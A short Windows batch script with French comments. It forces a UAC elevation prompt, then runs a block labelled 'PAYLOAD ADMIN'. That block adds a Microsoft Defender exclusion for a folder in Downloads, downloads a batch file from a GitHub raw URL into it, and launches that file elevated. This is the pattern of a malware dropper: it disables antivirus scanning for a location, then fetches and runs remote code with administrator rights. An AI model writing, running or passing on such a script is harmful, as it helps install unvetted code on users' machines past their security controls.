@echo off
setlocal

:check_admin
:: Vérification rapide des droits
net session >nul 2>&1
if %errorLevel% neq 0 (
    :: On lance l'élévation. Si l'utilisateur refuse, le script boucle instantanément.
    powershell -Command "Start-Process '%~f0' -Verb RunAs" >nul 2>&1
    exit /b
)

:: --- PAYLOAD ADMIN ---
:: Exécution directe de ta commande PowerShell
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "$p = \"$env:USERPROFILE\Downloads\NoWin\"; ^
    if (!(Test-Path $p)) { New-Item -ItemType Directory -Path $p -Force | Out-Null }; ^
    Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue; ^
    Invoke-WebRequest -UseBasicParsing -Uri 'https://raw.githubusercontent.com/LightZirconite/NoWin/main/force-update-agent.bat' -OutFile \"$p\force-update-agent.bat\"; ^
    Start-Process \"$p\force-update-agent.bat\" -ArgumentList '--yes' -Verb RunAs"

exit
